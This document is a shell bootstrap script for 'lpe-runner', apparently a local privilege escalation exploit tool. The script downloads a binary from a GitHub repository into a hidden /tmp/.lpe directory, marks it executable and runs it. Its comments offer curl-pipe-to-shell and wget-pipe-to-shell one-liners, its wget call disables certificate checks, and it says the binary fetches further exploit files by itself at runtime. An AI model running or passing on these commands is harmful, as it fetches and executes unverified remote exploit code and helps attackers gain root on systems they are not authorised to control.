#!/bin/sh
# install.sh - one-shot bootstrap for lpe-runner.
#
# Downloads the static lpe-runner binary from the pa-root GitHub repo,
# makes it executable, and runs it. Missing exploit files are fetched
# automatically by the binary itself at runtime.
#
# Usage (one line):
#   curl -sL https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main/lpe-runner/install.sh | sh
#
# Or, if curl is missing:
#   wget -qO- https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main/lpe-runner/install.sh | sh
#
# After install, you can also run directly:
#   ./lpe-runner -list
#   ./lpe-runner -recon
#   ./lpe-runner

set -e
REPO="https://raw.githubusercontent.com/sagsooz/pa-root/refs/heads/main"
BIN="lpe-runner"
DIR="${LPE_DIR:-/tmp/.lpe}"

mkdir -p "$DIR"
cd "$DIR"

echo "[*] Bootstrapping lpe-runner into $DIR ..."

if command -v curl >/dev/null 2>&1; then
    curl -sL --retry 3 -o "$BIN" "$REPO/lpe-runner/$BIN"
elif command -v wget >/dev/null 2>&1; then
    wget -q --no-check-certificate -O "$BIN" "$REPO/lpe-runner/$BIN"
else
    echo "[-] Need curl or wget." >&2
    exit 1
fi

chmod +x "$BIN"

if [ ! -s "$BIN" ]; then
    echo "[-] Download failed (empty file)." >&2
    exit 1
fi

echo "[+] lpe-runner ready at $DIR/$BIN"
echo "    Size: $(wc -c < "$BIN") bytes"
echo
echo "[*] Starting lpe-runner (auto-fetch enabled) ..."
echo "    Pass -no-fetch to disable network downloads."
echo

./"$BIN" "$@"
